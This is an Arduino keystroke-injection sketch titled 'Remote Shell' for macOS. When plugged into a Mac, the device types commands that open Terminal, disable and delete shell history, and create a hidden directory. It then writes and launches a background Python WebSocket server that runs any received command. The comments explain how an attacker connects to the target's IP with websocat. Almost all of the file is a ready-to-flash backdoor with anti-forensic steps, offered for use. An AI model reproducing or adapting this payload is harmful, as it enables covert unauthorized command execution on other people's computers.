// Generated with <3 by Dckuino.js !

#include "Keyboard.h"
void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Code Begins Here

  // Creates a hidden directory in the home directory named .phantom_ws.
  // Navigates into the new directory.
  // Writes a Python script (server.py)
  // This sets up a WebSocket server and allows command execution from received WebSocket messages.
  // Starts the Python script in the background with nohup, suppressing all output.
  // Clears the terminal history and exits the terminal.
  // to connect to the shell remotley: 'brew install websocat'
  // After you've installed websocat,
  // you can connect to your WebSocket server like this: 'websocat ws://localhost:8765'
  // Replace "localhost" with targets I.P. address
  // Once connected, you can type a command and press Enter to send it.
  // The server will execute the command and send back the output.
  // To shut down the server, use the kill command with the PID
  // Replace 12345 with the actual PID from your 'kill 12345'
  // Requirements: Homebrew/python3/websocat
  // Python 3 and websockets library need to be installed on the systemTerminal
  // command 'pip3 install websockets'
  // Title: Remote Shell
  // Author: NARSTY
  // Target: MacOS
  // Version: 1.0
  // Category: Execution
  // ID 05ac:021e Apple:Keyboard
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("Terminal");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("echo -e \"export HISTCONTROL=ignorespace\\nunset HISTFILE\" >> ~/.bashrc && source ~/.bashrc && exec bash");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("history -d $(history | tail -n 2 | head -n 1 | awk '{ print $1 }')");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print(" mkdir ~/.phantom_ws && cd ~/.phantom_ws");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print(" echo 'import asyncio\\nimport websockets\\nimport subprocess\\n\\nasync def execute_command(websocket, path):\\n    async for message in websocket:\\n        cmd = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\\n        cmd_output = cmd.stdout.read() + cmd.stderr.read()\\n        await websocket.send(cmd_output.decode())\\n\\nstart_server = websockets.serve(execute_command, \"localhost\", 8765)\\n\\nasyncio.get_event_loop().run_until_complete(start_server)\\nasyncio.get_event_loop().run_forever()' > server.py");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print(" nohup python3 server.py > /dev/null 2>&1 &");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print(" clear");

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* endless loop */
void loop() {}